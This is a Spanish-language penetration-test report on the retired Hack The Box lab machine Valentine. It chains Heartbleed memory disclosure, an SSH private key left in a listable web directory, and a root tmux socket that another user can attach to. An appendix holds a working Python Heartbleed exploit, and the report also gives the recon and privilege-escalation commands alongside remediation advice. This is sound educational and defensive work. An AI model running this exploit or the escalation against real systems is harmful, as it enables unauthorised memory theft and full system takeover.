---
report_id: HO-0017-00
target: Valentine
platform: Hack The Box
os: Linux
difficulty: Easy
ip: 10.129.232.136
date: 2026-10-24
version: 1.0
author: Francisco Nieto
status: Final
tags: [htb, linux, easy, heartbleed, cve-2014-0160, tmux]
---

# Informe de Prueba de Penetración — Valentine

|                        |                                                                  |
| ---------------------- | ---------------------------------------------------------------- |
| **ID de informe**      | HO-0017-00                                                       |
| **Objetivo**           | Valentine (`10.129.232.136`)                                     |
| **Plataforma**         | Hack The Box — máquina retirada                                  |
| **Tipo de prueba**     | Caja negra (black box)                                           |
| **Fecha de ejecución** | 2026-10-24                                                       |
| **Autor**              | Francisco Nieto — [@NiettoFrann](https://github.com/NiettoFrann) |
| **Versión**            | 1.0                                                              |
| **Clasificación**      | Público — uso educativo                                          |

> **Aviso legal.** Las pruebas se realizaron sobre un entorno de laboratorio autorizado
> (Hack The Box) y sobre una máquina retirada. Ninguna técnica descrita debe aplicarse
> sobre sistemas sin autorización expresa por escrito de su propietario.

### Control de versiones

| Versión | Fecha      | Descripción     |
| ------- | ---------- | --------------- |
| 1.0     | 2026-10-24 | Versión inicial |

---

## Índice

1. [Resumen ejecutivo](#1-resumen-ejecutivo)
2. [Alcance y metodología](#2-alcance-y-metodología)
3. [Narrativa del ataque](#3-narrativa-del-ataque)
4. [Hallazgos técnicos](#4-hallazgos-técnicos)
5. [Post-explotación](#5-post-explotación)
6. [Conclusiones](#6-conclusiones)
7. [Anexos](#7-anexos)

---

## 1. Resumen ejecutivo

### 1.1 Objetivo

Evaluar la seguridad del host **Valentine** simulando un atacante externo sin
credenciales ni conocimiento previo del entorno, con el fin de obtener el máximo nivel
de privilegios posible.

### 1.2 Resultado

> El servidor ejecutaba una versión de su software de cifrado afectada por un fallo
> público y crítico (conocido como _Heartbleed_). Ese fallo permitió leer, desde fuera
> y sin autenticarse, fragmentos de la memoria del servidor, entre los que apareció una
> contraseña. Al mismo tiempo, el sitio web dejaba descargar una clave de acceso privada
> alojada en una carpeta visible. Combinando ambos datos se consiguió entrar al sistema
> como un usuario legítimo y, a partir de una sesión administrativa mal protegida que
> había quedado abierta, se obtuvo el control total del equipo. Un atacante real podría
> haber leído, modificado o destruido toda la información del servidor.

**Nivel de riesgo global:** `ALTO`

### 1.3 Distribución de hallazgos

| Crítica | Alta | Media | Baja | Informativa |
| :-----: | :--: | :---: | :--: | :---------: |
|    0    |  2   |   1   |  0   |      0      |

### 1.4 Resumen de hallazgos

| ID                                                                             | Hallazgo                                              | Severidad | CVSS |
| ------------------------------------------------------------------------------ | ----------------------------------------------------- | --------- | ---- |
| [HO-0017-01](#ho-0017-01--divulgación-de-memoria-por-heartbleed-cve-2014-0160) | Divulgación de memoria por Heartbleed (CVE-2014-0160) | Alta      | 7.5  |
| [HO-0017-02](#ho-0017-02--clave-privada-ssh-expuesta-en-directorio-web)        | Clave privada SSH expuesta en directorio web          | Media     | 5.3  |
| [HO-0017-03](#ho-0017-03--escalada-a-root-por-socket-de-tmux-accesible)        | Escalada a root por socket de tmux accesible          | Alta      | 7.8  |

### 1.5 Recomendaciones prioritarias

1. Actualizar OpenSSL a una versión no afectada por Heartbleed (≥ 1.0.1g) y renovar
   todo material criptográfico que haya podido quedar expuesto (claves, contraseñas).
2. Retirar del directorio web cualquier fichero sensible (claves privadas, notas) y
   restringir el acceso a los directorios de desarrollo.
3. Aplicar mínimo privilegio a las sesiones y sockets de `tmux`: no dejar sesiones de
   `root` desatendidas sobre sockets accesibles por otros usuarios.

---

## 2. Alcance y metodología

### 2.1 Alcance

| Activo    | Dirección        | Incluido |
| --------- | ---------------- | :------: |
| Valentine | `10.129.232.136` |    Sí    |

**Fuera de alcance:** ataques de denegación de servicio, infraestructura de la
plataforma y otros jugadores.

### 2.2 Metodología

La prueba siguió las fases del estándar **PTES** (Penetration Testing Execution
Standard), apoyándose en **OWASP WSTG** para los componentes web:

1. **Reconocimiento** — descubrimiento de puertos y servicios.
2. **Enumeración** — identificación de versiones, tecnologías y superficie de ataque.
3. **Análisis de vulnerabilidades** — validación manual de posibles fallos.
4. **Explotación** — obtención de acceso inicial.
5. **Post-explotación** — escalada de privilegios y movimiento lateral.
6. **Reporte** — documentación de hallazgos y recomendaciones.

### 2.3 Entorno del auditor

| Componente   | Detalle                                                                                                                |
| ------------ | ---------------------------------------------------------------------------------------------------------------------- |
| Sistema      | Linux (kernel 7.2.11-zen1-1-zen)                                                                                       |
| Conexión     | VPN de Hack The Box                                                                                                    |
| Herramientas | nmap, gobuster, exploit propio de Heartbleed (Python), `xxd`/`openssl` (decodificación hex), `base64`, OpenSSH, `tmux` |

### 2.4 Clasificación de severidad

Las vulnerabilidades se puntúan con **CVSS v3.1**:

| Severidad   | Puntaje  | Criterio                                            |
| ----------- | :------: | --------------------------------------------------- |
| Crítica     | 9.0–10.0 | Compromiso total, remoto y sin autenticación.       |
| Alta        | 7.0–8.9  | Compromiso significativo o escalada de privilegios. |
| Media       | 4.0–6.9  | Impacto limitado o con condiciones previas.         |
| Baja        | 0.1–3.9  | Impacto mínimo.                                     |
| Informativa |   0.0    | Buena práctica, sin impacto directo.                |

---

## 3. Narrativa del ataque

### 3.1 Cadena de compromiso

```mermaid
flowchart LR
    A["Reconocimiento<br/>22 · 80 · 443"] --> B["HO-0017-01<br/>Heartbleed → passphrase"]
    A --> C["HO-0017-02<br/>/dev/hype_key expuesta"]
    B --> D["Descifrado de la<br/>clave RSA"]
    C --> D
    D --> E["SSH como<br/>hype (user.txt)"]
    E --> F["HO-0017-03<br/>socket tmux de root"]
    F --> G["root (root.txt)"]
```

### 3.2 Reconocimiento

Descubrimiento de puertos abiertos en todo el rango TCP:

```bash
nmap -p- --min-rate=5000 -T4 -Pn -n -oN puertos.txt 10.129.232.136
```

Detección de servicios y versiones sobre los puertos encontrados:

```bash
nmap -sVC -p22,80,443 -T4 -Pn -n -oN detallado.txt 10.129.232.136
```

| Puerto  | Servicio | Versión                                   | Observaciones                                                   |
| ------- | -------- | ----------------------------------------- | --------------------------------------------------------------- |
| 22/tcp  | SSH      | OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu) | Sin credenciales; se descarta como vector inicial.              |
| 80/tcp  | HTTP     | Apache httpd 2.2.22 (Ubuntu)              | Aplicación web; superficie de ataque principal.                 |
| 443/tcp | HTTPS    | Apache httpd 2.2.22 (Ubuntu) — SSL        | Certificado `CN=valentine.htb`. OpenSSL candidato a Heartbleed. |

Las versiones de Apache (2.2.22) y OpenSSH (5.9p1) son antiguas y sitúan al host en una
base Ubuntu de la era 12.04 LTS, coherente con software sin mantenimiento.

> Salida completa en el [Anexo A](#a-salida-completa-de-escaneos).

### 3.3 Enumeración

Sobre el servicio web se ejecutó fuerza bruta de directorios y ficheros:

```bash
gobuster dir -u http://10.129.232.136 \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt --add-slash
```

Se identificaron rutas accesibles (código `200`):

- `/encode/` y `/decode/` — una pequeña utilidad web que codifica y decodifica texto en
  **Base64** (`encode.php` / `decode.php`). Dato relevante: fija el formato en el que el
  servidor maneja secretos.
- `/dev/` — un directorio de desarrollo listable que contenía el fichero **`hype_key`**.

El fichero `hype_key` resultó ser un volcado en **hexadecimal**. Al decodificarlo se
obtuvo una **clave privada RSA cifrada** (`Proc-Type: 4,ENCRYPTED` / `AES-128-CBC`), es
decir, protegida por _passphrase_. Quedaba pendiente obtener esa passphrase
(ver [HO-0017-02](#ho-0017-02--clave-privada-ssh-expuesta-en-directorio-web)).

```bash
# El contenido de /dev/hype_key venía como pares hex separados por espacios
cat hype_key_hex | tr -d ' \n' | xxd -r -p > hype_key
head -3 hype_key
# -----BEGIN RSA PRIVATE KEY-----
# Proc-Type: 4,ENCRYPTED
# DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46
```

En paralelo, la versión antigua de OpenSSL en el puerto 443 motivó una comprobación de
**Heartbleed** con el script de Nmap, que confirmó la vulnerabilidad
(ver [HO-0017-01](#ho-0017-01--divulgación-de-memoria-por-heartbleed-cve-2014-0160)):

```bash
nmap -p 443 --script ssl-heartbleed -oN heartbleed.txt 10.129.232.136
```

### 3.4 Acceso inicial

La explotación de Heartbleed (HO-0017-01) volcó memoria del servidor en la que apareció
una petición `POST /decode.php` con el parámetro `$text` en Base64. Al decodificarlo se
obtuvo la **passphrase** de la clave RSA. Con la passphrase y la clave `hype_key`
recuperada de `/dev` se accedió por SSH como el usuario **`hype`**:

```bash
ssh -i hype_key hype@10.129.232.136
# Enter passphrase for key 'hype_key': heartbl*****************
```

Resumen y detalle técnico en **[HO-0017-01](#ho-0017-01--divulgación-de-memoria-por-heartbleed-cve-2014-0160)**
y **[HO-0017-02](#ho-0017-02--clave-privada-ssh-expuesta-en-directorio-web)**.

### 3.5 Movimiento lateral

No fue necesario movimiento lateral entre usuarios: el acceso inicial ya se produjo
directamente como el usuario del sistema **`hype`**, propietario de la flag de usuario.

### 3.6 Escalada de privilegios

La enumeración de vías habituales (sudoers, binarios SUID, _capabilities_) no reveló
nada aprovechable. La revisión de procesos mostró una sesión de **`tmux`** ejecutándose
como `root` sobre un socket accesible, cuya conexión otorgó una shell de `root`.

Resumen y detalle técnico en **[HO-0017-03](#ho-0017-03--escalada-a-root-por-socket-de-tmux-accesible)**.

---

## 4. Hallazgos técnicos

### HO-0017-01 — Divulgación de memoria por Heartbleed (CVE-2014-0160)

|                         |                                                                                 |
| ----------------------- | ------------------------------------------------------------------------------- |
| **Severidad**           | Alta                                                                            |
| **CVSS v3.1**           | 7.5 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`                            |
| **CWE**                 | [CWE-125](https://cwe.mitre.org/data/definitions/125.html) — Out-of-bounds Read |
| **CVE**                 | [CVE-2014-0160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160)   |
| **Componente afectado** | `https://10.129.232.136:443` — OpenSSL 1.0.1 (extensión _heartbeat_ TLS)        |
| **Estado**              | Explotada                                                                       |

#### Descripción

El servicio HTTPS usaba una versión de OpenSSL (rama 1.0.1) afectada por **Heartbleed**.
El fallo está en el manejo de la extensión _Heartbeat_ de TLS: el servidor confía en la
longitud declarada por el cliente sin validarla contra la longitud real del payload
enviado. Un cliente puede pedir que se le devuelvan hasta **64 KB** de datos adjuntando
un payload mínimo, y el servidor responde copiando memoria contigua del proceso —
incluyendo datos de otras conexiones: cabeceras, cuerpos de peticiones, credenciales y,
potencialmente, claves privadas. La causa raíz es una **lectura fuera de límites**
(out-of-bounds read) por falta de validación de longitud.

#### Prueba de concepto

**Paso 1.** Confirmación de la vulnerabilidad con Nmap.

```bash
nmap -p 443 --script ssl-heartbleed 10.129.232.136
# | ssl-heartbleed:
# |   VULNERABLE:
# |     State: VULNERABLE
# |     Risk factor: High
# |_      ...CVE-2014-0160
```

**Paso 2.** Explotación con un PoC propio en Python que envía un `ClientHello` TLS 1.1 y
a continuación un _heartbeat_ malicioso declarando `payload_length = 0x4000` (16384) con
0 bytes de payload real (ver [Anexo B](#b-scripts-y-exploits)).

```bash
python3 exploit.py 10.129.232.136
# [+] Vulnerable. Fugados 16384 bytes:
```

**Paso 3.** En el volcado de memoria aparece una petición a la utilidad web `/decode.php`
con el secreto en Base64:

```text
POST /decode.php HTTP/1.1 ... Content-Type: application/x-www-form-urlencoded
$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
```

**Paso 4.** Decodificación del valor fugado → _passphrase_ de la clave RSA.

```bash
echo 'aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==' | base64 -d
# heartbl*****************
```

#### Impacto

Lectura remota y **no autenticada** de memoria del proceso del servidor. En esta prueba
expuso directamente la _passphrase_ que, combinada con la clave privada expuesta
(HO-0017-02), permitió el acceso por SSH. El impacto real abarca cualquier dato sensible
que transitase por el servicio: credenciales, tokens de sesión o claves.

#### Remediación

- **Corto plazo:** actualizar OpenSSL a una versión corregida (≥ 1.0.1g) o recompilar con
  `-DOPENSSL_NO_HEARTBEATS`; reiniciar los servicios que la usen.
- **Largo plazo:** rotar **todo** el material criptográfico potencialmente expuesto
  (claves privadas, certificados, contraseñas) y mantener un proceso de gestión de
  parches para componentes criptográficos.

#### Referencias

- [CVE-2014-0160 — Heartbleed](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160)
- [OpenSSL Security Advisory 20140407](https://www.openssl.org/news/secadv/20140407.txt)
- [CWE-125 — Out-of-bounds Read](https://cwe.mitre.org/data/definitions/125.html)

---

### HO-0017-02 — Clave privada SSH expuesta en directorio web

|                         |                                                                                                   |
| ----------------------- | ------------------------------------------------------------------------------------------------- |
| **Severidad**           | Media                                                                                             |
| **CVSS v3.1**           | 5.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`                                              |
| **CWE**                 | [CWE-522](https://cwe.mitre.org/data/definitions/522.html) — Insufficiently Protected Credentials |
| **CVE**                 | —                                                                                                 |
| **Componente afectado** | `http://10.129.232.136/dev/hype_key`                                                              |
| **Estado**              | Explotada                                                                                         |

#### Descripción

El servidor web exponía un directorio de desarrollo (`/dev/`) listable que contenía una
**clave privada RSA** del usuario `hype`, almacenada como volcado hexadecimal
(`hype_key`). Cualquier visitante no autenticado podía descargarla. La clave estaba
cifrada con _passphrase_ (AES-128-CBC), lo que por sí solo limita el impacto; sin
embargo, combinada con la passphrase fugada en HO-0017-01 resultó en acceso completo al
sistema. La causa raíz es la **publicación de material sensible en la raíz web** y la
ausencia de restricciones de acceso al directorio de desarrollo. La severidad se puntúa
como Media por tratarse de una clave cifrada (confidencialidad `Baja` de forma aislada);
el riesgo efectivo escala a crítico al encadenarla con HO-0017-01.

#### Prueba de concepto

```bash
# Descarga del fichero hex expuesto
curl -s http://10.129.232.136/dev/hype_key -o hype_key_hex

# Decodificación de hex a la clave RSA
cat hype_key_hex | tr -d ' \n' | xxd -r -p > hype_key
chmod 600 hype_key

# Uso de la clave con la passphrase obtenida en HO-0017-01
ssh -i hype_key hype@10.129.232.136
```

#### Impacto

Exposición de credenciales de acceso al sistema. Junto con la passphrase, habilitó el
acceso remoto autenticado como `hype`, saltándose cualquier control del servicio SSH.

#### Remediación

- **Corto plazo:** retirar `hype_key` y cualquier otro secreto del directorio web;
  deshabilitar el listado de directorios (`Options -Indexes`).
- **Largo plazo:** no almacenar claves privadas en rutas servidas por el servidor web;
  rotar la clave comprometida y gestionar secretos fuera del _docroot_.

#### Referencias

- [CWE-522 — Insufficiently Protected Credentials](https://cwe.mitre.org/data/definitions/522.html)
- [OWASP WSTG — Review of Old Backup and Unreferenced Files for Sensitive Information](https://owasp.org/www-project-web-security-testing-guide/)

---

### HO-0017-03 — Escalada a root por socket de tmux accesible

|                         |                                                                                                                    |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------ |
| **Severidad**           | Alta                                                                                                               |
| **CVSS v3.1**           | 7.8 — `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`                                                               |
| **CWE**                 | [CWE-732](https://cwe.mitre.org/data/definitions/732.html) — Incorrect Permission Assignment for Critical Resource |
| **CVE**                 | —                                                                                                                  |
| **Componente afectado** | Socket `tmux` de root en `/.devs/dev_sess`                                                                         |
| **Estado**              | Explotada                                                                                                          |

#### Descripción

El sistema mantenía una sesión de **`tmux`** ejecutándose como `root` sobre un socket en
`/.devs/dev_sess`. Al estar el socket accesible para el usuario `hype`, conectarse a él
con `tmux` adjuntaba la sesión **existente de `root`**, otorgando una shell con sus
privilegios. La causa raíz es una **asignación de permisos incorrecta sobre un recurso
crítico**: una sesión administrativa desatendida sobre un socket que un usuario sin
privilegios podía abrir.

#### Prueba de concepto

**Paso 1.** Enumeración de procesos; se descartan sudoers, SUID y _capabilities_.

```bash
ps -aux | grep -i tmux
# root  1021  ... Ss  07:12  0:01 /usr/bin/tmux -S /.devs/dev_sess
```

**Paso 2.** Conexión al socket de root con el mismo comando.

```bash
/usr/bin/tmux -S /.devs/dev_sess
```

**Paso 3.** Confirmación de privilegios y lectura de la flag.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
# 438546c3************************
```

#### Impacto

Compromiso total del host: ejecución de comandos como `root`, acceso a toda la
información del sistema y control de los servicios.

#### Remediación

- **Corto plazo:** cerrar la sesión de `tmux` de `root` y eliminar el socket
  `/.devs/dev_sess`; no dejar sesiones administrativas desatendidas.
- **Largo plazo:** aplicar permisos restrictivos a sockets y ficheros de sesión
  (propiedad y modo accesibles solo por su dueño); evitar directorios compartidos para
  sesiones privilegiadas y aplicar el principio de mínimo privilegio.

#### Referencias

- [CWE-732 — Incorrect Permission Assignment for Critical Resource](https://cwe.mitre.org/data/definitions/732.html)
- [GTFOBins — tmux](https://gtfobins.github.io/gtfobins/tmux/)

---

## 5. Post-explotación

### 5.1 Acceso obtenido

| Nivel         | Usuario | Método                  | Prueba                                          |
| ------------- | ------- | ----------------------- | ----------------------------------------------- |
| Usuario       | `hype`  | HO-0017-01 + HO-0017-02 | `user.txt` — `0cece3c7************************` |
| Administrador | `root`  | HO-0017-03              | `root.txt` — `438546c3************************` |

> Las credenciales y flags se muestran parcialmente censuradas.

### 5.2 Información sensible expuesta

| Tipo                          | Ubicación                             | Observación                                                           |
| ----------------------------- | ------------------------------------- | --------------------------------------------------------------------- |
| Clave privada RSA (cifrada)   | `http://10.129.232.136/dev/hype_key`  | Descargable sin autenticación (HO-0017-02).                           |
| Passphrase de la clave        | Memoria del proceso (fuga Heartbleed) | `heartbl*****************`, en Base64 vía `/decode.php` (HO-0017-01). |
| Datos en memoria del servidor | Servicio HTTPS (443)                  | Hasta 64 KB por petición mientras persista Heartbleed.                |

### 5.3 Limpieza

| Artefacto                | Ubicación                            | Estado                                                  |
| ------------------------ | ------------------------------------ | ------------------------------------------------------- |
| Copia local de la clave  | `loot/hype_key`, `loot/hype_key_hex` | Conservados como evidencia (fuera del objetivo).        |
| Exploit de Heartbleed    | `scripts/exploit.py`                 | En el equipo del auditor; no desplegado en el objetivo. |
| Sesión de `tmux` de root | `/.devs/dev_sess` (objetivo)         | No creada por el auditor; preexistente — no modificada. |

---

## 6. Conclusiones

### 6.1 Conclusión técnica

El compromiso no dependió de un único fallo, sino del **encadenamiento** de tres
debilidades: software criptográfico obsoleto y vulnerable (Heartbleed), una mala gestión
de secretos (clave privada publicada en la raíz web) y una configuración insegura de
privilegios (sesión de `root` en `tmux` sobre un socket accesible). Heartbleed y la clave
expuesta se complementaron —ninguno bastaba por separado, pues la clave estaba cifrada y
la passphrase aislada era inútil— para producir el acceso inicial; la sesión de `tmux`
desatendida convirtió ese acceso de usuario en control total. El caso ilustra cómo la
falta de actualización, la higiene de secretos y el mínimo privilegio se refuerzan entre
sí: fallar en los tres hace trivial el salto de "sin acceso" a `root`.

### 6.2 Aprendizajes del auditor

- Desarrollo de un **PoC propio de Heartbleed** (construcción manual del `ClientHello` y
  del _heartbeat_ con longitud falsificada) en lugar de usar solo la herramienta pública,
  reforzando la comprensión del protocolo TLS a bajo nivel.
- La fuga de Heartbleed es ruidosa: hubo que **filtrar y decodificar** las cadenas Base64
  del volcado para aislar el dato útil; automatizarlo en el exploit ahorró tiempo.
- La escalada no estaba en los vectores "clásicos" (sudo/SUID/caps): la clave fue
  **enumerar procesos** y reconocer que un socket de `tmux` de root es adjuntable.

---

## 7. Anexos

### A. Salida completa de escaneos

<details>
<summary>nmap — descubrimiento de puertos</summary>

```text
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

</details>

<details>
<summary>nmap — servicios y versiones</summary>

```text
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

</details>

<details>
<summary>nmap — ssl-heartbleed</summary>

```text
| ssl-heartbleed:
|   VULNERABLE:
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases ... are affected by the Heartbleed bug.
|     References:
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
```

</details>

<details>
<summary>gobuster — enumeración de directorios</summary>

```text
decode/    (Status: 200)
dev/       (Status: 200)
encode/    (Status: 200)
index.php/ (Status: 200)
```

</details>

### B. Scripts y exploits

<details>
<summary>exploit.py — PoC de Heartbleed (CVE-2014-0160)</summary>

```python
#!/usr/bin/env python3
import socket, struct, sys, re, base64

# ClientHello TLS 1.1 + heartbeat malicioso (payload_length=0x4000, 0 bytes reales)
hello = bytes.fromhex(
    "16030200dc010000d80302534"
    "35b909d9b720bbc0cbc2b92a84897cf" "bd3904cc160a850390"
    "9f770433d4de0000" "66c014c00ac022c021003900380088"
    "0087c00fc0050035" "0084c012c008c01c" "c01b00160013c00d"
    "c003000ac013c009" "c01fc01e00330032" "009a009900450044"
    "c00ec004002f0096" "0041c011c007c00c"
    "c0020005000400150012000900140011" "000800060003"
    "00ff01000049000b000403000102000a0034" "00320"
    "00e000d0019000b000c0018" "0009000a0016001700080006"
    "0007001400150004000500120013" "000100020003000f00100011"
    "002300000" "00f000101"
)
heartbeat = bytes.fromhex("1803020003014000")  # type=01, payload_len=0x4000 (mentira)

def recv_all(s, n):
    data = b""
    while len(data) < n:
        chunk = s.recv(n - len(data))
        if not chunk: return None
        data += chunk
    return data

def recv_record(s):
    hdr = recv_all(s, 5)
    if hdr is None: return None, None, None
    typ, ver, length = struct.unpack(">BHH", hdr)
    return typ, ver, recv_all(s, length)

def analizar(payload):
    for b64 in re.findall(rb"[A-Za-z0-9+/]{12,}={0,2}", payload):
        try:
            dec = base64.b64decode(b64, validate=True)
        except Exception:
            continue
        if dec and all(32 <= c < 127 or c in b"\n\r\t" for c in dec):
            print(f"    {b64.decode()}  ->  {dec.decode(errors='replace').strip()}")

target = sys.argv[1]
s = socket.create_connection((target, 443), timeout=10)
s.send(hello)
while True:
    typ, ver, payload = recv_record(s)
    if typ is None: sys.exit("[-] handshake incompleto")
    if typ == 22 and payload and payload[0] == 0x0E:  # ServerHelloDone
        break
s.send(heartbeat)
typ, ver, payload = recv_record(s)
if typ == 24 and payload:
    print(f"[+] Vulnerable. Fugados {len(payload)} bytes")
    analizar(payload)
```

_Nota:_ se apoyó además en el exploit público `32764.py` (Csaba Fitzl, EDB — CVE-2014-0160)
como referencia.

</details>

### C. Mapeo MITRE ATT&CK

| Táctica              | Técnica                             | ID                                                          |
| -------------------- | ----------------------------------- | ----------------------------------------------------------- |
| Discovery            | Process Discovery                   | [T1057](https://attack.mitre.org/techniques/T1057/)         |
| Initial Access       | Exploit Public-Facing Application   | [T1190](https://attack.mitre.org/techniques/T1190/)         |
| Credential Access    | Unsecured Credentials: Private Keys | [T1552.004](https://attack.mitre.org/techniques/T1552/004/) |
| Lateral Movement     | Valid Accounts                      | [T1078](https://attack.mitre.org/techniques/T1078/)         |
| Privilege Escalation | Abuse Elevation Control Mechanism   | [T1548](https://attack.mitre.org/techniques/T1548/)         |

### D. Referencias generales

- [PTES — Penetration Testing Execution Standard](http://www.pentest-standard.org/)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Calculadora CVSS v3.1 — FIRST](https://www.first.org/cvss/calculator/3.1)
- [MITRE ATT&CK](https://attack.mitre.org/)
